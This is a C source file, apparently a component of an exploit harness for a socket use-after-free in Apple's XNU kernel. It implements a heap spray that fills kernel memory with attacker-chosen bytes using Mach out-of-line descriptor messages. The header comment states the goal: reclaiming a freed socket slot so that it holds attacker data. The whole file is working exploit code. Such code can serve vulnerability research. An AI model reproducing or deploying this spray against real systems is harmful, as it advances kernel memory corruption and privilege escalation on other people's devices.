// Cross-zone reclaim spray for the socket-UAF harness.
// Sends MACH_MSG_OOL_DESCRIPTOR messages with MACH_MSG_VIRTUAL_COPY so the
// kernel copies the payload into fresh kernel memory. Deliberately *not*
// sockets, so a freed socket slot reclaimed this way holds attacker bytes.

#include <mach/mach.h>
#include <mach/message.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define SOCKUAF_MAX_PORTS 1024

static mach_port_t sockuaf_ports[SOCKUAF_MAX_PORTS];
static int sockuaf_port_count;

void sockuaf_ool_reset(void) { sockuaf_port_count = 0; }

int sockuaf_ool_count(void) { return sockuaf_port_count; }

int sockuaf_ool_spray(size_t size, int count, uint64_t fill)
{
    if (count > SOCKUAF_MAX_PORTS - sockuaf_port_count)
        count = SOCKUAF_MAX_PORTS - sockuaf_port_count;
    if (count <= 0 || size == 0)
        return 0;

    uint8_t *buf = malloc(size);
    if (!buf)
        return 0;
    for (size_t i = 0; i < size; i += 8) {
        uint64_t v = fill;
        size_t n = size - i < 8 ? size - i : 8;
        memcpy(buf + i, &v, n);
    }

    int made = 0;
    for (int i = 0; i < count; i++) {
        mach_port_t port = MACH_PORT_NULL;
        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port) != KERN_SUCCESS)
            break;
        if (mach_port_insert_right(mach_task_self(), port, port,
                                   MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
            mach_port_deallocate(mach_task_self(), port);
            break;
        }

        struct {
            mach_msg_header_t header;
            mach_msg_body_t body;
            mach_msg_ool_descriptor_t desc;
        } msg;
        memset(&msg, 0, sizeof(msg));
        msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
        msg.header.msgh_size = sizeof(msg);
        msg.header.msgh_remote_port = port;
        msg.header.msgh_local_port = MACH_PORT_NULL;
        msg.header.msgh_id = 0x4f4f5343;
        msg.body.msgh_descriptor_count = 1;
        msg.desc.address = buf;
        msg.desc.size = (mach_msg_size_t)size;
        msg.desc.deallocate = 0;
        msg.desc.copy = MACH_MSG_VIRTUAL_COPY;
        msg.desc.type = MACH_MSG_OOL_DESCRIPTOR;

        kern_return_t kr = mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0,
                                    MACH_PORT_NULL, 0, MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            mach_port_deallocate(mach_task_self(), port);
            break;
        }
        sockuaf_ports[sockuaf_port_count++] = port;
        made++;
    }
    free(buf);
    return made;
}
